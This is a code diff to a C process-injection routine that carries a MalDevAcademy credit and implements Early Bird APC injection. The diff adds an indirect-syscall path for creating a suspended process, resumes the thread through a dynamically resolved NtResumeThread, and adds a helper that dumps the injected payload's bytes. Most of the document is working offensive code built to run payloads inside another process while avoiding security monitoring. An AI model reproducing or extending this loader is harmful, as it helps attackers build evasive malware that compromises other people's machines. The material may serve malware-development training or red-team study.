@@ -1,6 +1,29 @@
 // @NUL0x4C | @mrd0x : MalDevAcademy
 
 #include "injection.h"
+#include <stdio.h>
+
+void PrintMemoryBytes(HANDLE hProcess, PVOID pAddress, SIZE_T byteCount) {
+    BYTE buffer[20]; // Buffer to hold the first 20 bytes
+    SIZE_T bytesRead = 0;
+
+    if (byteCount > sizeof(buffer)) {
+        printf("[!] Requested byte count exceeds buffer size.\n");
+        return;
+    }
+
+    if (ReadProcessMemory(hProcess, pAddress, buffer, byteCount, &bytesRead)) {
+        printf("\n\n<===    MEMORY OUTPUT    ===>\n\n");
+        printf("[i] Memory at 0x%p (First %llu bytes):\n", pAddress, byteCount);
+        for (SIZE_T i = 0; i < bytesRead; i++) {
+            printf("%02X ", buffer[i]);
+        }
+        printf("\n\n<===========================>\n\n");
+    }
+    else {
+        printf("[!] Failed to read process memory at 0x%p. Error: %lu\n", pAddress, GetLastError());
+    }
+}
 
 
 /*
@@ -67,12 +90,25 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 //	creating target remote process (in debugged state)
 	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);
 
+#ifdef HW_INDIRECT_SYSCALL
+    NTSTATUS status;
+    PROCESS_INFORMATION pi;
 
+    if (!CreateSuspendedProcessWithSyscall(szProcessName, &pi)) {
+        DebugPrint("[!] Failed to create process using indirect syscall.\n");
+        return FALSE;
+    }
+
+    dwProcessId = pi.dwProcessId;
+    hProcess = pi.hProcess;
+    hThread = pi.hThread;
+#else
     if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread)) {
 		return FALSE;
 	}
+#endif
 
-	DebugPrint("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
+	DebugPrint("[i] Suspended Process Created With Pid : %d \n", dwProcessId);
 	DebugPrint("[+] DONE \n\n");
 
 
@@ -81,6 +117,7 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	if (!payload_loading(&pAddress, pPayload, sPayloadSize, hProcess, szProcessName)) {
 		return FALSE;
 	}
+	PrintMemoryBytes(hProcess, pAddress, 20);
 	DebugPrint("[+] DONE \n\n");
 
 //	running QueueUserAPC
@@ -95,19 +132,35 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
     }
     DebugPrint("[+] DONE \n");
 #else
-	QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
+    QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
 #endif
 
 //	since 'CreateSuspendedProcess2' create a process in debug mode,
 //	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
-	DebugPrint("[i] Detaching The Target Process ... ");
-	DebugActiveProcessStop(dwProcessId);
+	//DebugPrint("[i] Detaching The Target Process ... ");
+	//DebugActiveProcessStop(dwProcessId);
+    DebugPrint("[i] Resuming The Suspended Thread ... ");
+    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char *)("NtResumeThread"));
+    ULONG suspendCount = 0;
+    if ((STATUS = pNtResumeThread(hThread, &suspendCount)) != 0) {
+        DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
+        return FALSE;
+    }
+    DebugPrint("[+] Thread Resumed Successfully \n\n");
+
+    // Optional: Wait for the injected code to execute
+    Sleep(2000);
 	DebugPrint("[+] DONE \n\n");
 
 // Closing the handles to the process and thread
+    if (!TerminateProcess(hProcess, 0)) {
+        DebugPrint("[!] Failed to terminate process. Error: %d\n", GetLastError());
+    }
+    else {
+        DebugPrint("[+] Process Terminated Successfully.\n");
+    }
 	CloseHandle(hProcess);
 	CloseHandle(hThread);
 
 	return TRUE;
 }
-
